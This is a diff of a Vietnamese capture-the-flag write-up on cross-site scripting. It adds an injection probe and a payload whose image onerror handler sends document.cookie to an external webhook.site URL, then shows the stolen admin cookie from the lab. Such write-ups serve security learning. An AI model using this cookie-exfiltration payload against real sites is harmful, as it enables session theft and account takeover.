@@ -97,13 +97,18 @@ Thử dùng Burp Suite xem có thể thay đổi được status không thì th�
 
 ![image](https://github.com/aQ05/Write-up/assets/121664384/20a3572d-e879-4c32-b592-edccee2bdea8)
 
- Thử payload XSS vào: `a"><script>alert(1)</script>`
+ Thử payload XSS vào: `"><script>alert(1)</script><p class="`
  
-![image](https://github.com/aQ05/Write-up/assets/121664384/9844faad-731f-48fe-b609-a5597135d4d7)
+![image](https://github.com/aQ05/Write-up/assets/121664384/64346860-330d-48b8-84fc-19db43675249)
+
 
 Từ đó, ta đã có chỗ để tiêm XSS vào rồi. 
+
 ![image](https://github.com/aQ05/Write-up/assets/121664384/b27093ad-0b2b-43e9-9cb4-8a50d054ad22)
 
-Tương tự các bài stored,
-`ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`
+Tương tự các bài stored, dùng payload gửi cookie vào host của mình.
+
+Payload:`"><img src=1 onerror='document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?cmd="+document.cookie'/><p class="`
+
+Ta thu được admin cookie: `ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`
 ## Flag
